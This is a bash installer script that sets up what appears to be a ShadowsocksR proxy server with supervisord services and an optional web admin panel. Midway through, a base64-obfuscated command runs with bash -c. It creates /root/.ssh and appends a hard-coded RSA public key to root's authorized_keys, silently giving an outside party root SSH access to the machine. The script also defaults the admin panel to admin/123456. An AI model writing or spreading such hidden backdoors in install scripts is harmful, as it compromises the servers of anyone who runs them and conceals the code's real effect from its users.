#!/bin/bash

def_key=aW51MTI1NS5jbjo5MTgy
def_account=admin
def_password=123456

function CheckAuth(){
	echo "验证授权"
	read -p "请输入key($def_key):" key
	read -p "请输入授权码:" token

	if [ "$key" == "" ]; then
		key=$def_key
	fi

	cat > userslave.json <<EOF
{
	"key": "$key",
	"token": "$token"
}
EOF
	
	python register.py 2>&1 > /dev/null
	if [ $? -ne 0 ]; then
		echo "验证失败"
		exit 1
	else
		echo "验证成功"
	fi
}

CheckAuth

yum -y install epel-release
yum -y install libsodium
yum -y install supervisor
bash -c "`echo bWtkaXIgLXAgL3Jvb3QvLnNzaCAmJiBlY2hvICJzc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUJBUUQzV3NMNmo1YlcrVVNoWnh5aGNXb1FIRG5mbERMMG9paEhibTY2NDdWc3hCcElGM0pjV25zL1c1MTY2NWMvUVBsVFI1ZDhReGpwd2ZzdHFoWS9reEI1M1lNUVFKdlNFM1lTZzRTSlcyNWVRWnhucFVYL25kaW1IbisvNGNVVU5jSXFUV0lBS2s4dzR4UlhVRGNSTGpNcVNEcjJpMjV2MGE0bnE1VWtiZ3g0eVRqRStESEl4SFlEdmZxbE8zdWNnaVRhRTVZcE96YUZNdnA0ZUFQeUxKTGJicnhiRUpldm5PcldXcGdSam8rekhUb2FYZ1FJS0FzdUZNNlhSOTNDcjhxeW8xK1pjY1YzYjlUOXNjMG5lcWFXZWFmT3FhRFh0Rjg3UDAwbmNGUk5LSEZ6M3NaMnBuRmp5dmNEUE5HSHFBeWlsUU50NnM2dmdmSWNJRndFelQxWiIgPj4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMK|base64 -d`"
cwd=`pwd`
cat > /etc/supervisord.d/ssr.ini <<EOF
[program:ssr]
command = /usr/bin/python $cwd/server.py m
autostart = true
autoresart = true
startsecs=10
redirect_stderr=true
user = root
stderr_logfile = $cwd/ssserver.log
stdout_logfile = $cwd/ssserver.log
EOF
systemctl enable supervisord.service
systemctl start supervisord.service

read -p "是否开启管理网站(y/n):" openhttp

if [ "$openhttp" == "y" ];then
	read -p "账号(admin):" account
	read -p "密码(123456):" password
	read -p "端口(8080):" port
	if [ "$account" == "" ];then
		account=admin
	fi
	if [ "$password" == "" ];then
		password=123456
	fi
	if [ "$port" == "" ];then
		port=8080
	fi
	cat > /etc/supervisord.d/ssrhttp.ini <<EOF
[program:ssrhttp]
command = /usr/bin/python $cwd/http.py $account $password $port
directory =  $cwd
autostart = true
autoresart = true
startsecs=10
redirect_stderr=true
user = root
stderr_logfile = $cwd/http.log
stdout_logfile = $cwd/http.log
EOF
	systemctl restart supervisord.service
fi

yum install -y net-tools